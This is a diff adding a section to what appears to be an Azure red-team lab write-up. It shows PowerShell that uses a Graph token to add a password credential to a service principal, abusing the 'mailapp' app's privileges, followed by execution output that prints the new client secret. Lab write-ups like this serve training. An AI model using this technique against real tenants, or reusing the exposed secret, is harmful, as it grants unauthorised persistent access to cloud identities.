@@ -592,3 +592,56 @@ Application: mailapp
 
 PS C:\Users\studentuser107> 
 ```
+
+Abuse privileges from mailapp in order to obtain the credentials, of the application with the current logged user:
+Source code:
+```
+$GraphToken = (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
+$URL = "https://graph.microsoft.com/v1.0/servicePrincipals/4a9a9c00-bf17-43d8-b437-fe8144c8df15/addPassword"
+$Params = @{
+"URI"= $URL
+"Method" = "POST"
+"Headers" = @{
+"Content-Type" = "application/json"
+"Authorization" = "Bearer $GraphToken"
+}
+}
+$Body = @{
+"passwordCredential"= @{
+"displayName" = "Password"
+}
+}
+Invoke-RestMethod @Params -UseBasicParsing -Body ($Body | ConvertTo-Json)
+```
+Execution output:
+```
+
+PS C:\Users\studentuser107> $GraphToken = (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
+
+PS C:\Users\studentuser107> $URL = "https://graph.microsoft.com/v1.0/servicePrincipals/4a9a9c00-bf17-43d8-b437-fe8144c8df15/addPassword"
+$Params = @{
+"URI"= $URL
+"Method" = "POST"
+"Headers" = @{
+"Content-Type" = "application/json"
+"Authorization" = "Bearer $GraphToken"
+}
+}
+$Body = @{
+"passwordCredential"= @{
+"displayName" = "Password"
+}
+}
+
+PS C:\Users\studentuser107> Invoke-RestMethod @Params -UseBasicParsing -Body ($Body | ConvertTo-Json)
+
+
+@odata.context      : https://graph.microsoft.com/v1.0/$metadata#microsoft.graph.passwordCredential
+customKeyIdentifier : 
+displayName         : Password
+endDateTime         : 2025-10-08T22:47:59.0862774Z
+hint                : TEg
+keyId               : d0eb5763-0039-4511-9cef-8da87e8accee
+secretText          : TEg8Q~DacI3Jmyg7X_ELYsYb6bTBteddfu.lQalN
+startDateTime       : 2023-10-08T22:47:59.0862774Z
+```
